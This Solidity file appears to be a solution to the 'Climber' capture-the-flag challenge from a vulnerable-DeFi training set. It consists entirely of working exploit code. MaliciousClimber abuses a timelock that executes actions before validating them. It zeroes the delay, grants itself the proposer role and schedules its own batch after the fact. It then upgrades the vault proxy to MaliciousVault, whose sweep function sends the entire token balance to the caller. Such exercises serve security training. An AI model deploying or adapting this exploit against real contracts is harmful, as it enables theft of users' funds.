// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract MaliciousVault is ClimberVault {
    function sweepToSender(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }
}
contract MaliciousClimber {
    using Address for address;

    address timelock;
    address vault;
    address token;
    address maliciousVault;
    uint8 constant ACTIONS = 3;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address[] targets;
    uint256[] values;
    bytes[] datas;
    bytes32 salt;

    constructor(address _timelock, address _vault, address _token, address _maliciousVault) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        maliciousVault = _maliciousVault;
    }

    function attack() external {
        {
            targets.push(timelock);
            values.push(0);
            datas.push(abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0)));
        }
        {
            targets.push(timelock);
            values.push(0);
            datas.push(abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this)));
        }
        {
            targets.push(address(this));
            values.push(0);
            datas.push(abi.encodeWithSelector(this.schedule.selector));
        }
        {
            targets.push(vault);
            values.push(0);
            datas.push(abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, maliciousVault));
        }
        ClimberTimelock(payable(timelock)).execute(targets, values, datas, salt);
        MaliciousVault(vault).sweepToSender(token);
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function schedule() external {
        ClimberTimelock(payable(timelock)).schedule(targets, values, datas, salt);
    }
}